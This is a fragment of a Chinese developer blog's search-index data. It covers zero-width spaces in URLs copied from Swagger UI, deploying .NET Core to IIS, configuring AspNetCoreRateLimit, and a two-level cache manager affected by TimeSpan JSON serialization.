","date":"2023-09-08","objectID":"/blog/posts/%E7%B6%B2%E5%9D%80%E5%87%BA%E7%8F%BE-Zero-width-space-%E5%95%8F%E9%A1%8C%E8%88%87%E8%A7%A3%E6%B1%BA%E6%96%B9%E5%BC%8F/:3:0","tags":["html","swagger","空白字元","零寬空格"],"title":"網址出現 %E2%80%8B 問題與解決方式","uri":"/blog/posts/%E7%B6%B2%E5%9D%80%E5%87%BA%E7%8F%BE-Zero-width-space-%E5%95%8F%E9%A1%8C%E8%88%87%E8%A7%A3%E6%B1%BA%E6%96%B9%E5%BC%8F/"},{"categories":["HTML"],"content":"不要從 swagger 複製 url 原來是從 swagger 文件複製連結關係。看到這篇也跟我遇到一樣問題。 %E2%80%8B Appears in url .Net Core - Stack Overflow ","date":"2023-09-08","objectID":"/blog/posts/%E7%B6%B2%E5%9D%80%E5%87%BA%E7%8F%BE-Zero-width-space-%E5%95%8F%E9%A1%8C%E8%88%87%E8%A7%A3%E6%B1%BA%E6%96%B9%E5%BC%8F/:4:0","tags":["html","swagger","空白字元","零寬空格"],"title":"網址出現 %E2%80%8B 問題與解決方式","uri":"/blog/posts/%E7%B6%B2%E5%9D%80%E5%87%BA%E7%8F%BE-Zero-width-space-%E5%95%8F%E9%A1%8C%E8%88%87%E8%A7%A3%E6%B1%BA%E6%96%B9%E5%BC%8F/"},{"categories":["HTML"],"content":"複製到零寬字元原因 想說奇怪我別的專案沒有這個問題，我同事建立的怎麼會有這個問題?他的版本是6.2.3，看新版 swagger-ui 沒有這個問題，這邊換成最新版的Swashbuckle.AspNetCore就沒有這個問題。 swagger 文件為 Visual Studio 怎麼貼上都沒辦法看到。 複製到 Sublime Text 就看到真相。 真正原因是 swagger ui 某一版使用\u0026ZeroWidthSpace;，所以複製的時候都會有奇奇怪怪的。但是用\u003cwbr\u003e就沒這個問題。 最後無聊翻一下 swagger ui 看到為了 url path 符合 ZeroWidthPath 所做的事情。 inject zero-width spaces for better path breaking improvement: operation path + summary overflow styling (via #5184) · swagger-api/swagger-ui@291e2c7 最後這邊換成\u003cwbr\u003e就沒這個問題。 swagger-ui/src/core/components/operation-summary-path.jsx at 70b01404a77e0a4ee69304951cd951369b1db5ab · swagger-api/swagger-ui Info \u003cwbr\u003e讓你複製不會有空白字元，這也是後來 swagger ui 為什麼調整成這樣。 ","date":"2023-09-08","objectID":"/blog/posts/%E7%B6%B2%E5%9D%80%E5%87%BA%E7%8F%BE-Zero-width-space-%E5%95%8F%E9%A1%8C%E8%88%87%E8%A7%A3%E6%B1%BA%E6%96%B9%E5%BC%8F/:4:1","tags":["html","swagger","空白字元","零寬空格"],"title":"網址出現 %E2%80%8B 問題與解決方式","uri":"/blog/posts/%E7%B6%B2%E5%9D%80%E5%87%BA%E7%8F%BE-Zero-width-space-%E5%95%8F%E9%A1%8C%E8%88%87%E8%A7%A3%E6%B1%BA%E6%96%B9%E5%BC%8F/"},{"categories":["HTML"],"content":"wbr 影響裝置換行特性 這邊真的會跟裝置瀏覽器視窗，可以決定單一單字可以做換行，但目前這樣好處應用還沒有想法。這邊是看到這個影片才發現有這個特性。 (196) wbr Tag in HTML (Hindi) - YouTube Info 想到以前有研究控制換行動作，這邊可以複習。 [CSS]文字換行的問題 - 程式狂想筆記 這邊資源真的不多，這邊找CHATGPT看看。 Tip CHATGPT問答 \u003cwbr\u003e html 使用這個 tags有什麼好處？ 在HTML中，\u003cwbr\u003e標記表示\"Word Break Opportunity\"，即\"單字換行機會\"。它用於指示瀏覽器在需要時可以在指定位置進行換行，避免單字溢出到下一行。使用\u003cwbr\u003e標記有以下幾個好處： 控制換行位置：使用\u003cwbr\u003e標記可以精確地控制換行的位置，以避免出現不合適的換行點，確保文本的可讀性和美觀性。特別是在處理長單字或網址時，可以使用\u003cwbr\u003e標記將這些內容正確地分割成多個行。 支持響應式布局：在響應式布局中，螢幕的寬度可能發生變化，文本可能需要在不同的設備和螢幕大小上顯示。使用\u003cwbr\u003e標記可以幫助適應不同的視窗寬度，將文本優雅地換行，以適應不同的螢幕布局。 改善搜尋引擎最佳化：對於包含長單字或連結的文本，如果沒有適當的換行機制，搜尋引擎可能無法正確解析和索引這些內容。透過使用\u003cwbr\u003e標記，可以增加搜尋引擎對文本內容的理解和索引能力。 總而言之，使用\u003cwbr\u003e標記可以提供更好的文本布局和可讀性，確保長單字或連結可以正確換行，並支持響應式布局和搜尋引擎最佳化。 最後覺得機器人回答第三點滿有趣，第一和第二點跟我找影片 demo 實作一樣。 ","date":"2023-09-08","objectID":"/blog/posts/%E7%B6%B2%E5%9D%80%E5%87%BA%E7%8F%BE-Zero-width-space-%E5%95%8F%E9%A1%8C%E8%88%87%E8%A7%A3%E6%B1%BA%E6%96%B9%E5%BC%8F/:5:0","tags":["html","swagger","空白字元","零寬空格"],"title":"網址出現 %E2%80%8B 問題與解決方式","uri":"/blog/posts/%E7%B6%B2%E5%9D%80%E5%87%BA%E7%8F%BE-Zero-width-space-%E5%95%8F%E9%A1%8C%E8%88%87%E8%A7%A3%E6%B1%BA%E6%96%B9%E5%BC%8F/"},{"categories":["Windows"],"content":"第一次部屬Net Core程式，部屬要怎麼做。參考網路方式，有看到Web Deploy，不過第一次部屬我覺得還是先用手動部屬，之後再嘗試 Web Deploy。本篇採取手動布署程式。 Info 之後再嘗試 Web Deploy。 有完成筆記紀錄，不過是不建議使用方式。相關可參考這篇Web IIS Web Deploy 操作記錄 - 程式狂想筆記)。 ","date":"2023-09-03","objectID":"/blog/posts/%E5%9C%A8-IIS-%E9%83%A8%E7%BD%B2-Net-Core-%E7%A8%8B%E5%BC%8F/:0:0","tags":["windows","iis",".net core","deploy"],"title":"在 IIS 佈署 .Net Core 程式","uri":"/blog/posts/%E5%9C%A8-IIS-%E9%83%A8%E7%BD%B2-Net-Core-%E7%A8%8B%E5%BC%8F/"},{"categories":["Windows"],"content":"安裝步驟 參考:[鼠年全馬鐵人挑戰]Week02-部署ASP.NET Core 3.1 專案至IIS上 | by Nina Weng | Medium 安裝 .NET Core 的 Hosting Bundle 版本 安裝過程不詳細說明。 啟用 IIS IIS 新增站台 Visual Stuio 發布專案 把相對應路徑複製到 IIS 站台路徑 注意這邊 web.config是 IIS 設定。 ","date":"2023-09-03","objectID":"/blog/posts/%E5%9C%A8-IIS-%E9%83%A8%E7%BD%B2-Net-Core-%E7%A8%8B%E5%BC%8F/:1:0","tags":["windows","iis",".net core","deploy"],"title":"在 IIS 佈署 .Net Core 程式","uri":"/blog/posts/%E5%9C%A8-IIS-%E9%83%A8%E7%BD%B2-Net-Core-%E7%A8%8B%E5%BC%8F/"},{"categories":["Windows"],"content":"特別設定 ","date":"2023-09-03","objectID":"/blog/posts/%E5%9C%A8-IIS-%E9%83%A8%E7%BD%B2-Net-Core-%E7%A8%8B%E5%BC%8F/:2:0","tags":["windows","iis",".net core","deploy"],"title":"在 IIS 佈署 .Net Core 程式","uri":"/blog/posts/%E5%9C%A8-IIS-%E9%83%A8%E7%BD%B2-Net-Core-%E7%A8%8B%E5%BC%8F/"},{"categories":["Windows"],"content":"選擇無託管 我朋友建議選這個選項，但我還沒研究為什麼要選這個。 ","date":"2023-09-03","objectID":"/blog/posts/%E5%9C%A8-IIS-%E9%83%A8%E7%BD%B2-Net-Core-%E7%A8%8B%E5%BC%8F/:2:1","tags":["windows","iis",".net core","deploy"],"title":"在 IIS 佈署 .Net Core 程式","uri":"/blog/posts/%E5%9C%A8-IIS-%E9%83%A8%E7%BD%B2-Net-Core-%E7%A8%8B%E5%BC%8F/"},{"categories":["Windows"],"content":"布署錯誤問題 ","date":"2023-09-03","objectID":"/blog/posts/%E5%9C%A8-IIS-%E9%83%A8%E7%BD%B2-Net-Core-%E7%A8%8B%E5%BC%8F/:3:0","tags":["windows","iis",".net core","deploy"],"title":"在 IIS 佈署 .Net Core 程式","uri":"/blog/posts/%E5%9C%A8-IIS-%E9%83%A8%E7%BD%B2-Net-Core-%E7%A8%8B%E5%BC%8F/"},{"categories":["Windows"],"content":".netcore web部署之後訪問報錯HTTP Error 500.31 - ANCM Failed to Find Native Dependencies 參考: .netcore web部署之后访问报错HTTP Error 500.31 - ANCM Failed to Find Native Dependencies - 安然亦智 - 博客园 [NETCore] ASP.NET Core 啟動失敗 - failed to start process with commandline ~ m@rcus 學習筆記 ","date":"2023-09-03","objectID":"/blog/posts/%E5%9C%A8-IIS-%E9%83%A8%E7%BD%B2-Net-Core-%E7%A8%8B%E5%BC%8F/:3:1","tags":["windows","iis",".net core","deploy"],"title":"在 IIS 佈署 .Net Core 程式","uri":"/blog/posts/%E5%9C%A8-IIS-%E9%83%A8%E7%BD%B2-Net-Core-%E7%A8%8B%E5%BC%8F/"},{"categories":["Windows"],"content":"404 問題 web.config 確認 IIS 權限 IUSRS IIS_USRS IIS AppPool\\xxxName 相關文章可參考: IIS 資料夾權限的設定方式 | The Skeptical Software Engineer IIS 應用程式設定資料夾權限 | ShunNien’s Blog 浮雲雅築: [研究] IUSR 與 IIS_USRS 差別 ","date":"2023-09-03","objectID":"/blog/posts/%E5%9C%A8-IIS-%E9%83%A8%E7%BD%B2-Net-Core-%E7%A8%8B%E5%BC%8F/:3:2","tags":["windows","iis",".net core","deploy"],"title":"在 IIS 佈署 .Net Core 程式","uri":"/blog/posts/%E5%9C%A8-IIS-%E9%83%A8%E7%BD%B2-Net-Core-%E7%A8%8B%E5%BC%8F/"},{"categories":["Windows"],"content":"發布排除 web.config 參考:[.Net] 佈署 .net core 到 Azure VM 上的 IIS 但是忽略 web.config | 當麻許的超技八 \u003cPropertyGroup\u003e \u003cTargetFramework\u003enetcoreapp3.1\u003c/TargetFramework\u003e \u003cIsTransformWebConfigDisabled\u003etrue\u003c/IsTransformWebConfigDisabled\u003e \u003c/PropertyGroup\u003e 其他相關文章: 從部署|排除檔案和資料夾Microsoft Docs | Microsoft Docs 使用 IIS 在 Windows 上託管 ASP.NET Core | 微軟文檔 使用 MSDeploy 手動部署網站時如何避免 Web.config 被更新 | The Will Will Web 感覺是.Net Standard舊程式設定，不確定在.NET Core有沒有效。 Tip 之前同事說假如有調整 web.config 的話，可以在專案建立 web.config。在產生布署檔案會順便憶起產生。所以可能也不需要這樣設定? ","date":"2023-09-03","objectID":"/blog/posts/%E5%9C%A8-IIS-%E9%83%A8%E7%BD%B2-Net-Core-%E7%A8%8B%E5%BC%8F/:3:3","tags":["windows","iis",".net core","deploy"],"title":"在 IIS 佈署 .Net Core 程式","uri":"/blog/posts/%E5%9C%A8-IIS-%E9%83%A8%E7%BD%B2-Net-Core-%E7%A8%8B%E5%BC%8F/"},{"categories":["Windows"],"content":"最近要裝線上環境，第一次沒安裝過 IIS，這邊網路上找了教學，雖然還滿簡單的，這邊簡單紀錄一下。 ","date":"2023-09-03","objectID":"/blog/posts/Window-Server-2019-%E5%AE%89%E8%A3%9D-IIS/:0:0","tags":["window","iis"],"title":"Window Server 2019 安裝 IIS","uri":"/blog/posts/Window-Server-2019-%E5%AE%89%E8%A3%9D-IIS/"},{"categories":["Windows"],"content":"Window Server 2019 安裝 IIS 步驟 參照:在 Windows Server 2022 安裝 IIS - YouTube 點選 Server Manager ，裡面點選 Add roles and features 下一步 下一步 下一步 點選Web Service(IIS)繼續下一步 點選 Add Features 點選下一步 點選下一步 點選Application Development和WebSocket Protocol，然後繼續下一步 點選Install進行安裝 他會跑一段時間，完成安裝點選關閉 IIS 可建立捷徑方便新增/管理站台。 ","date":"2023-09-03","objectID":"/blog/posts/Window-Server-2019-%E5%AE%89%E8%A3%9D-IIS/:1:0","tags":["window","iis"],"title":"Window Server 2019 安裝 IIS","uri":"/blog/posts/Window-Server-2019-%E5%AE%89%E8%A3%9D-IIS/"},{"categories":[".Net Core"],"content":"之前看很多樂觀鎖都是做防止修改同一筆資料，但最近同事之前用 RateLimit 預防前端遇到連點新增兩筆資料，這次專案我也類似用這個方法，前端程式我非能控制，這邊後端用這個方法做個補強。 Warning .Net 7 有自己做 RateLimit，不一定要使用這個工具。這邊考慮用原生。 Built-in Rate Limiting support - part of .NET 7 · Issue #382 · stefanprodan/AspNetCoreRateLimit ，這邊我工作是 .Net 5專案，所以使用stefanprodan/AspNetCoreRateLimit: ASP.NET Core rate limiting middleware。 ","date":"2023-08-28","objectID":"/blog/posts/AspNetCoreRateLimit-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/:0:0","tags":[".netcore","rate","limit","ratelimit","防重送"],"title":"AspNetCoreRateLimit 使用小記","uri":"/blog/posts/AspNetCoreRateLimit-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/"},{"categories":[".Net Core"],"content":"心智圖 mindmap AspNetCoreRateLimit 官方內建方法 IpRateLimit ClientRateLimit Token based 驗證方法 ","date":"2023-08-28","objectID":"/blog/posts/AspNetCoreRateLimit-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/:1:0","tags":[".netcore","rate","limit","ratelimit","防重送"],"title":"AspNetCoreRateLimit 使用小記","uri":"/blog/posts/AspNetCoreRateLimit-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/"},{"categories":[".Net Core"],"content":"IpRateLimit // needed to load configuration from appsettings.json // 一般專案都會有，可以省略 // services.AddOptions(); // needed to store rate limit counters and ip rules // 需要載入 MemoryCache，實際看你用哪個 Cache services.AddMemoryCache(); //load general configuration from appsettings.json // 載入 IpRateLimit services.Configure\u003cIpRateLimitOptions\u003e(Configuration.GetSection(\"IpRateLimiting\")); //load ip rules from appsettings.json // 載入 Ip RateLimit 設定 services.Configure\u003cIpRateLimitPolicies\u003e(Configuration.GetSection(\"IpRateLimitPolicies\")); // inject counter and rules stores // 載入 Memory Rate Limit services.AddInMemoryRateLimiting(); //services.AddDistributedRateLimiting\u003cAsyncKeyLockProcessingStrategy\u003e(); //services.AddDistributedRateLimiting\u003cRedisProcessingStrategy\u003e(); //services.AddRedisRateLimiting(); // configuration (resolvers, counter key builders) // 使用 IpRateLimit services.AddSingleton\u003cIRateLimitConfiguration, RateLimitConfiguration\u003e(); UseIpRateLimiting app.UseAuthorization(); app.UseIpRateLimiting(); Warning 雖然官方沒有講 UseIpRateLimiting 設定在哪裡，但需要加到UseAuthorization後面，我原本設定最上面，我API 超過次數 Response Http Status 回傳 0，後然突然想到我之前寫的這篇(.Net Core 設定 Middleware 引發前端錯誤問題 - 程式狂想筆記)。 設定檔案 \"IpRateLimiting\": { \"EnableEndpointRateLimiting\": false, \"StackBlockedRequests\": false, \"RealIpHeader\": \"X-Real-IP\", \"ClientIdHeader\": \"X-ClientId\", \"HttpStatusCode\": 429, \"IpWhitelist\": [ \"127.0.0.1\", \"::1/10\", \"192.168.0.0/24\" ], \"EndpointWhitelist\": [ \"get:/api/license\", \"*:/api/status\" ], \"ClientWhitelist\": [ \"dev-id-1\", \"dev-id-2\" ], \"GeneralRules\": [ { \"Endpoint\": \"*\", \"Period\": \"1s\", \"Limit\": 2 }, { \"Endpoint\": \"*\", \"Period\": \"15m\", \"Limit\": 100 }, { \"Endpoint\": \"*\", \"Period\": \"12h\", \"Limit\": 1000 }, { \"Endpoint\": \"*\", \"Period\": \"7d\", \"Limit\": 10000 } ] } ","date":"2023-08-28","objectID":"/blog/posts/AspNetCoreRateLimit-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/:2:0","tags":[".netcore","rate","limit","ratelimit","防重送"],"title":"AspNetCoreRateLimit 使用小記","uri":"/blog/posts/AspNetCoreRateLimit-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/"},{"categories":[".Net Core"],"content":"設定說明 EnableEndpointRateLimiting 不同設定對規則引響不太一樣，假如設為true，所有規則 Rate Limit Count 是拆開的。false所有規則會加總算。 If EnableEndpointRateLimiting is set to false then the limits will apply globally and only the rules that have as endpoint * will apply. For example, if you set a limit of 5 calls per second, any HTTP call to any endpoint will count towards that limit. If EnableEndpointRateLimiting is set to true, then the limits will apply for each endpoint as in {HTTP_Verb}{PATH}. For example if you set a limit of 5 calls per second for *:/api/values a client can call GET /api/values 5 times per second but also 5 times PUT /api/values. StackBlockedRequests當API RateLimit出現，訪問中API要不要計算在內，通常是設定false。 RealIpHeader通常反向代理後會有 IP 參考 Header，這邊可以針對情況調整，沒有 Header 他會抓 IP資料。 也有針對 IP 設定也可以設定，不過我是沒設定這段。 \"IpRateLimitPolicies\": { \"IpRules\": [ { \"Ip\": \"84.247.85.224\", \"Rules\": [ { \"Endpoint\": \"*\", \"Period\": \"1s\", \"Limit\": 10 }, { \"Endpoint\": \"*\", \"Period\": \"15m\", \"Limit\": 200 } ] }, { \"Ip\": \"192.168.3.22/25\", \"Rules\": [ { \"Endpoint\": \"*\", \"Period\": \"1s\", \"Limit\": 5 }, { \"Endpoint\": \"*\", \"Period\": \"15m\", \"Limit\": 150 }, { \"Endpoint\": \"*\", \"Period\": \"12h\", \"Limit\": 500 } ] } ] } ","date":"2023-08-28","objectID":"/blog/posts/AspNetCoreRateLimit-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/:2:1","tags":[".netcore","rate","limit","ratelimit","防重送"],"title":"AspNetCoreRateLimit 使用小記","uri":"/blog/posts/AspNetCoreRateLimit-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/"},{"categories":[".Net Core"],"content":"特定 API 設定 RateLimit 我專案只需要指定新增 Post API 不要一直呼叫，可以這樣設定。付款流程理論上8秒內只會觸發一次，這邊特別設定這樣。可以阻擋前端連點或不明原因呼叫。 \"IpRateLimiting\": { \"EnableEndpointRateLimiting\": true, \"StackBlockedRequests\": false, \"RealIpHeader\": \"X-Real-IP\", \"ClientIdHeader\": \"X-ClientId\", \"HttpStatusCode\": 429, \"IpWhitelist\": [], \"ClientWhitelist\": [], \"GeneralRules\": [ { \"Endpoint\": \"post:/api/Pay\", \"Period\": \"8s\", \"Limit\": 1 }, { \"Endpoint\": \"post:/api/newXXX\", \"Period\": \"1s\", \"Limit\": 1 } ] } ","date":"2023-08-28","objectID":"/blog/posts/AspNetCoreRateLimit-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/:2:2","tags":[".netcore","rate","limit","ratelimit","防重送"],"title":"AspNetCoreRateLimit 使用小記","uri":"/blog/posts/AspNetCoreRateLimit-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/"},{"categories":[".Net Core"],"content":"ClientLimit 當初看到 ClientId本來以為跟 OAuth 有關係，但其實沒有關係，他就是抓個Header上面的 X-Client。如果所有 Request 沒設定到就會把 X-Client 當作一樣 key。所以使用這個情境應該比較低，我也找不到 Reverse Proxy 設定 X-Client，不太了解這個使用時機。 使用方法跟 IpRateLimit 差不多，這邊就不完整顯示，請參考ClientRateLimitMiddleware · stefanprodan/AspNetCoreRateLimit Wiki。 ","date":"2023-08-28","objectID":"/blog/posts/AspNetCoreRateLimit-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/:3:0","tags":[".netcore","rate","limit","ratelimit","防重送"],"title":"AspNetCoreRateLimit 使用小記","uri":"/blog/posts/AspNetCoreRateLimit-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/"},{"categories":[".Net Core"],"content":"使用者驗證 其實 ClinetLimit和 IpRateLimit 實務上需求比較少，假如在同一個網域很多Web 做 Nat 情況下，使用者 IP 匯市一樣的，IpRateLimit會有問題。所以假如能做到身分驗證當 Key 就能解決這個問題。原生沒有這個方法，這邊找到幾個方式。 use jwt in rate limiting · Issue #37 · stefanprodan/AspNetCoreRateLimit Rate limit after authentication · Issue #82 · stefanprodan/AspNetCoreRateLimit 這邊整理一下找到方法。 ","date":"2023-08-28","objectID":"/blog/posts/AspNetCoreRateLimit-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/:4:0","tags":[".netcore","rate","limit","ratelimit","防重送"],"title":"AspNetCoreRateLimit 使用小記","uri":"/blog/posts/AspNetCoreRateLimit-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/"},{"categories":[".Net Core"],"content":"方法1: 使用 Authorization Header(Workaround) 不推薦 使用 \"ClientIdHeader\": \"Authorization\"，但這個缺點很明顯。使用這個 AccessToken 需要紀錄很長；還有第二個缺點，使用者換 Token 就不會阻擋。 參考:use jwt in rate limiting · Issue #37 · stefanprodan/AspNetCoreRateLimit ","date":"2023-08-28","objectID":"/blog/posts/AspNetCoreRateLimit-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/:4:1","tags":[".netcore","rate","limit","ratelimit","防重送"],"title":"AspNetCoreRateLimit 使用小記","uri":"/blog/posts/AspNetCoreRateLimit-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/"},{"categories":[".Net Core"],"content":"方法2: 設定 Request X-ClientId 為 User Identity 1.設定好相關Token-based 身分驗證理論上你的專案都有設定好，這邊就不說明。 在走 ClientRateLimmit前設定塞 X-ClientId。這邊可以額外拆 class， app.UseAuthorization(); app.Use(async(context, next)=\u003e { try { context.Request.Headers.Add(\"X-ClientId\", context.User.Identity!.Name); } catch (Exception) { context.Request.Headers.Add(\"X-ClientId\", \"not authenticated\"); } await next(); }); app.UseHttpLogging(); app.UseClientRateLimiting(); RateLimit:Rate limit after authentication · Issue #82 · stefanprodan/AspNetCoreRateLimit ","date":"2023-08-28","objectID":"/blog/posts/AspNetCoreRateLimit-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/:4:2","tags":[".netcore","rate","limit","ratelimit","防重送"],"title":"AspNetCoreRateLimit 使用小記","uri":"/blog/posts/AspNetCoreRateLimit-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/"},{"categories":[".Net Core"],"content":"方法3: RateLimit進階設定 這個寫法相對方法2比較正規寫法，自己寫相關規則去判斷再注入DI裡面去。 public class ElmahIoRateLimitConfiguration : RateLimitConfiguration { public ElmahIoRateLimitConfiguration( IOptions\u003cIpRateLimitOptions\u003e ipOptions, IOptions\u003cClientRateLimitOptions\u003e clientOptions) : base(ipOptions, clientOptions) { } public override void RegisterResolvers() { base.RegisterResolvers(); ClientResolvers.Add(new ClientQueryStringResolveContributor()); } } public class ClientQueryStringResolveContributor : IClientResolveContributor { public Task\u003cstring\u003e ResolveClientAsync(HttpContext httpContext) { var queryDictionary = Microsoft.AspNetCore.WebUtilities.QueryHelpers.ParseQuery( httpContext.Request.QueryString.ToString()); if (queryDictionary.ContainsKey(\"api_key\") \u0026\u0026 !string.IsNullOrWhiteSpace(queryDictionary[\"api_key\"])) { return Task.FromResult(queryDictionary[\"api_key\"].ToString()); } return Task.FromResult(Guid.NewGuid().ToString()); } } 參考: Built-in rate limiting in ASP.NET Core vs AspNetCoreRateLimit 我這個範例不是 Token-based ，這邊有另外一種寫法。 use jwt in rate limiting · Issue #37 · stefanprodan/AspNetCoreRateLimit 不過使用沒有很順利，這邊文章(How to implement Rate Limiting in an ASP.NET Core Web API)照網路設定順利可以跑。 // configuration (resolvers, counter key builders) builder.Services.AddSingleton\u003cIRateLimitConfiguration, CustomRateLimitConfiguration\u003e(); // 省略... internal class CustomRateLimitConfiguration : RateLimitConfiguration { public CustomRateLimitConfiguration( IOptions\u003cIpRateLimitOptions\u003e ipOptions, IOptions\u003cClientRateLimitOptions\u003e clientOptions) : base(ipOptions, clientOptions) { } public override void RegisterResolvers() { ClientResolvers.Add(new ClientIdResolverContributor()); } } internal class ClientIdResolverContributor : IClientResolveContributor { public Task\u003cstring\u003e ResolveClientAsync(HttpContext context) { return Task.FromResult\u003cstring\u003e(context.User.Identity.Name); } } ","date":"2023-08-28","objectID":"/blog/posts/AspNetCoreRateLimit-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/:4:3","tags":[".netcore","rate","limit","ratelimit","防重送"],"title":"AspNetCoreRateLimit 使用小記","uri":"/blog/posts/AspNetCoreRateLimit-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/"},{"categories":[".Net Core"],"content":"彩蛋 ","date":"2023-08-28","objectID":"/blog/posts/AspNetCoreRateLimit-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/:5:0","tags":[".netcore","rate","limit","ratelimit","防重送"],"title":"AspNetCoreRateLimit 使用小記","uri":"/blog/posts/AspNetCoreRateLimit-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/"},{"categories":[".Net Core"],"content":"nginx反向代理設定 Header asp.net core - how prevent rate limit reset after change `X-Real-IP` in request - Stack Overflow 如何讓在 Reverse Proxy 之後的網站正常運行 (URL Rewrite) | The Will Will Web Nginx 實作 reverse proxy server | 艾瑞克黑白講 - 點部落 ","date":"2023-08-28","objectID":"/blog/posts/AspNetCoreRateLimit-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/:5:1","tags":[".netcore","rate","limit","ratelimit","防重送"],"title":"AspNetCoreRateLimit 使用小記","uri":"/blog/posts/AspNetCoreRateLimit-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/"},{"categories":[".Net Core"],"content":"最近因為用兩層緩存，第一層會抓 Memory Cache，沒有資料會抓第二層 SQL Server Cache，在沒有資料會抓取 API 相關資料，簡單多層緩存功能。因為 IDistributedCache 無法抓取到資料庫該 key 設定的資料，這邊有把 DistributedCacheEntryOptions做 Json 序列化衍生這次慘劇。 ","date":"2023-08-27","objectID":"/blog/posts/Net-5-TimeSpan-%E5%81%9A-Json-%E5%BA%8F%E5%88%97%E5%8C%96%E5%BC%95%E7%99%BC%E7%9A%84%E6%85%98%E5%8A%87/:0:0","tags":[".netcore","timespan","json"],"title":"Net 5 TimeSpan 做 Json 序列化引發的慘劇","uri":"/blog/posts/Net-5-TimeSpan-%E5%81%9A-Json-%E5%BA%8F%E5%88%97%E5%8C%96%E5%BC%95%E7%99%BC%E7%9A%84%E6%85%98%E5%8A%87/"},{"categories":[".Net Core"],"content":"心智圖 mindmap .Net 5 TimeSpan 做 Json 序列化引發的慘劇 問題 .Net 5 和 .Net 6 TimeSpan 序列化不一樣結果 TimeSpan 屬性唯讀 解決方法 實作 System.Text.Json Converter 使用 Json.Net ","date":"2023-08-27","objectID":"/blog/posts/Net-5-TimeSpan-%E5%81%9A-Json-%E5%BA%8F%E5%88%97%E5%8C%96%E5%BC%95%E7%99%BC%E7%9A%84%E6%85%98%E5%8A%87/:1:0","tags":[".netcore","timespan","json"],"title":"Net 5 TimeSpan 做 Json 序列化引發的慘劇","uri":"/blog/posts/Net-5-TimeSpan-%E5%81%9A-Json-%E5%BA%8F%E5%88%97%E5%8C%96%E5%BC%95%E7%99%BC%E7%9A%84%E6%85%98%E5%8A%87/"},{"categories":[".Net Core"],"content":"前景提要 因為 IDistributedCache 無法抓取到資料庫該 key 設定的資料，這邊有把 DistributedCacheEntryOptions做 Json 序列化衍生這次慘劇。 主要我把程式使用CacheItem\u003cT\u003e封裝起來，最後做 Json 序列化存進去，解決從 Cache 資料表抓出來，可以知道相關設定寫入到資料庫。其實下面我也是用 ChatGPT 產生出來程式調整。 using Microsoft.Extensions.Caching.Distributed; using Microsoft.Extensions.Caching.Memory; using System.Threading.Tasks; using System; using System.Text.Json; namespace XxxxxxxBackend.WebAPI.Infrastructure { public class CacheManager { private readonly IMemoryCache _memoryCache; private readonly IDistributedCache _distributedCache; public CacheManager(IMemoryCache memoryCache, IDistributedCache distributedCache) { _memoryCache = memoryCache; _distributedCache = distributedCache; } public async Task\u003cT\u003e GetDataAsync\u003cT\u003e(string id, string dataGroup = \"MyData\", MemoryCacheEntryOptions memoryOptions = null) { string cacheKey = $\"{dataGroup}_{id}\"; if (!_memoryCache.TryGetValue(cacheKey, out T data)) { // 緩存未命中，從 IDistributedCache 獲取資料 byte[] cacheValue = await _distributedCache.GetAsync(cacheKey); if (cacheValue != null) { // 將字節數組轉換為泛型類型 T CachedItem\u003cT\u003e wrapData = JsonSerializer.Deserialize\u003cCachedItem\u003cT\u003e\u003e(cacheValue); data = wrapData.Value; // 將資料寫入 IMemoryCache memoryOptions ??= new MemoryCacheEntryOptions { SlidingExpiration = wrapData.Options.SlidingExpiration, AbsoluteExpirationRelativeToNow = wrapData.Options.AbsoluteExpirationRelativeToNow, AbsoluteExpiration = wrapData.Options.AbsoluteExpiration, }; _memoryCache.Set(cacheKey, data, memoryOptions); } else { // 資料不存在，執行其他邏輯 } } return data; } public async Task UpdateDataAsync\u003cT\u003e(string id, T data, string dataGroup = \"MyData\", MemoryCacheEntryOptions memoryOptions = null ,DistributedCacheEntryOptions distributedCacheOptions = null) { string cacheKey = $\"{dataGroup}_{id}\"; // 將泛型類型 T 轉換為字節數組 byte[] cacheValue = JsonSerializer.SerializeToUtf8Bytes(new CachedItem\u003cT\u003e {Options = distributedCacheOptions, Value = data} ); // 將資料寫入 IDistributedCache distributedCacheOptions ??= new DistributedCacheEntryOptions { SlidingExpiration = TimeSpan.FromMinutes(10), AbsoluteExpirationRelativeToNow = TimeSpan.FromHours(1), }; await _distributedCache.SetAsync(cacheKey, cacheValue, distributedCacheOptions); // 將資料寫入 IMemoryCache memoryOptions ??= new MemoryCacheEntryOptions { SlidingExpiration = TimeSpan.FromMinutes(5), AbsoluteExpirationRelativeToNow = TimeSpan.FromMinutes(10), }; _memoryCache.Set(cacheKey, data, memoryOptions); } public async Task DeleteDataAsync(string id, string dataGroup = \"MyData\") { string cacheKey = $\"{dataGroup}_{id}\"; _memoryCache.Remove(cacheKey); await _distributedCache.RemoveAsync(cacheKey); } } public class CachedItem\u003cT\u003e { public T Value { get; set; } public DistributedCacheEntryOptions Options { get; set; } } } 